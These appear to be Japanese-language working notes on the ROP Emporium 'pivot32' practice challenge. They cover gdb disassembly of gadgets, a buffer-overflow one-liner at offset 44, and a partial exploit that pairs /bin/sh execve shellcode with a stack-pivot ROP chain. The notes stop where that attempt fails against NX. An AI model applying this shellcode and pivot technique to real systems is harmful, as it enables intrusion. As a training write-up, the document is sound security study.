```
~/ctf/practice-pwn/ROP-Emporium/pivot32:yyy@(*｡˃̵ω ˂̵｡) < ./pivot32
pivot by ROP Emporium
32bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0xf7df0f08
Send your second chain now and it will land there
> hoge
Now kindly send your stack smash
> fuga

Exiting
```

やることは、 `Call ret2win() from libpivot.so` っぽい

1回目の入力はBoFしない？

2回目の入力は offset: 44


```
gdb-peda$ disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x080488c0 <+0>:	pop    eax
   0x080488c1 <+1>:	ret
   0x080488c2 <+2>:	xchg   esp,eax
   0x080488c3 <+3>:	ret
   0x080488c4 <+4>:	mov    eax,DWORD PTR [eax]
   0x080488c6 <+6>:	ret
   0x080488c7 <+7>:	add    eax,ebx
   0x080488c9 <+9>:	ret
   0x080488ca <+10>:	xchg   ax,ax
   0x080488cc <+12>:	xchg   ax,ax
   0x080488ce <+14>:	xchg   ax,ax
```

```
gdb-peda$ disas uselessFunction
Dump of assembler code for function uselessFunction:
   0x080488a1 <+0>:	push   ebp
   0x080488a2 <+1>:	mov    ebp,esp
   0x080488a4 <+3>:	sub    esp,0x8
   0x080488a7 <+6>:	call   0x80485f0 <foothold_function@plt>
   0x080488ac <+11>:	sub    esp,0xc
   0x080488af <+14>:	push   0x1
   0x080488b1 <+16>:	call   0x80485e0 <exit@plt>
```

uselessFunctionに遷移させてみる
```
$ python -c 'print "A\n" + "A" * 44 + "\xa1\x88\x04\x08"' |./pivot32
pivot by ROP Emporium
32bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0xf75dff08
Send your second chain now and it will land there
> Now kindly send your stack smash
> foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so
```



```
gdb-peda$ telescope 25
0000| 0xffffbd2c ("BBBBAAAAAAAAA")
0004| 0xffffbd30 ("AAAAAAAAA")
0008| 0xffffbd34 ("AAAAA")
0012| 0xffffbd38 --> 0x41 ('A')
0016| 0xffffbd3c --> 0x0
0020| 0xffffbd40 --> 0x1
0024| 0xffffbd44 --> 0xffffbe04 --> 0xffffc0b1 ("/home/yyy/yyy-d/work/ctf/pwn/ROP-Emporium/pivot32/pivot32")
0028| 0xffffbd48 --> 0xf7dedf08 ("CCCC\n")
0032| 0xffffbd4c --> 0xf6dee008 --> 0x0
0036| 0xffffbd50 --> 0xf7fa23dc --> 0xf7fa31e0 --> 0x0
0040| 0xffffbd54 --> 0xffffbd70 --> 0x1
0044| 0xffffbd58 --> 0x0
0048| 0xffffbd5c --> 0xf7e08637 (<__libc_start_main+247>: add    esp,0x10)
0052| 0xffffbd60 --> 0xf7fa2000 --> 0x1b1db0
0056| 0xffffbd64 --> 0xf7fa2000 --> 0x1b1db0
0060| 0xffffbd68 --> 0x0
0064| 0xffffbd6c --> 0xf7e08637 (<__libc_start_main+247>: add    esp,0x10)
0068| 0xffffbd70 --> 0x1
0072| 0xffffbd74 --> 0xffffbe04 --> 0xffffc0b1 ("/home/yyy/yyy-d/work/ctf/pwn/ROP-Emporium/pivot32/pivot32")
0076| 0xffffbd78 --> 0xffffbe0c --> 0xffffc0eb ("XDG_SEAT=seat0")
0080| 0xffffbd7c --> 0x0
0084| 0xffffbd80 --> 0x0
0088| 0xffffbd84 --> 0x0
0092| 0xffffbd88 --> 0xf7fa2000 --> 0x1b1db0
0096| 0xffffbd8c --> 0xf7ffdc04 --> 0x0
```


payload = ""
payload += "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x53\x31\xd2\x52\x6a\x0b\x58\xcd\x80"  # shellcode
payload += "\n"
payload += "A" * 44
payload += p32(pop_eax)
payload += p32(pivot_addr)
payload += p32(xchg_esp_eax)

これだと、mallocで確保された領域に実行権限がないので、invalidになるっぽい

Stopped reason: SIGSEGV
0x68732f68 in ?? ()
gdb-peda$ vmmap 0xf7dedf08
Start      End        Perm	Name
0xf6dee000 0xf7df0000 rw-p	mapped
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/home/yyy/yyy-d/work/ctf/pwn/ROP-Emporium/pivot32/pivot32
0x08049000 0x0804a000 r--p	/home/yyy/yyy-d/work/ctf/pwn/ROP-Emporium/pivot32/pivot32
0x0804a000 0x0804b000 rw-p	/home/yyy/yyy-d/work/ctf/pwn/ROP-Emporium/pivot32/pivot32
0x0804b000 0x0806d000 rw-p	[heap]
0xf6dee000 0xf7df0000 rw-p	mapped
0xf7df0000 0xf7fa0000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fa0000 0xf7fa2000 r--p	/lib/i386-linux-gnu/libc-2.23.so
0xf7fa2000 0xf7fa3000 rw-p	/lib/i386-linux-gnu/libc-2.23.so
0xf7fa3000 0xf7fa6000 rw-p	mapped
0xf7fd0000 0xf7fd1000 r-xp	/home/yyy/yyy-d/work/ctf/pwn/ROP-Emporium/pivot32/libpivot32.so
0xf7fd1000 0xf7fd2000 r--p	/home/yyy/yyy-d/work/ctf/pwn/ROP-Emporium/pivot32/libpivot32.so
0xf7fd2000 0xf7fd3000 rw-p	/home/yyy/yyy-d/work/ctf/pwn/ROP-Emporium/pivot32/libpivot32.so
0xf7fd3000 0xf7fd5000 rw-p	mapped
0xf7fd5000 0xf7fd7000 r--p	[vvar]
0xf7fd7000 0xf7fd9000 r-xp	[vdso]
0xf7fd9000 0xf7ffb000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 rw-p	mapped
0xf7ffc000 0xf7ffd000 r--p	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rw-p	/lib/i386-linux-gnu/ld-2.23.so
0xfffdc000 0xffffe000 rw-p	[stack]
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
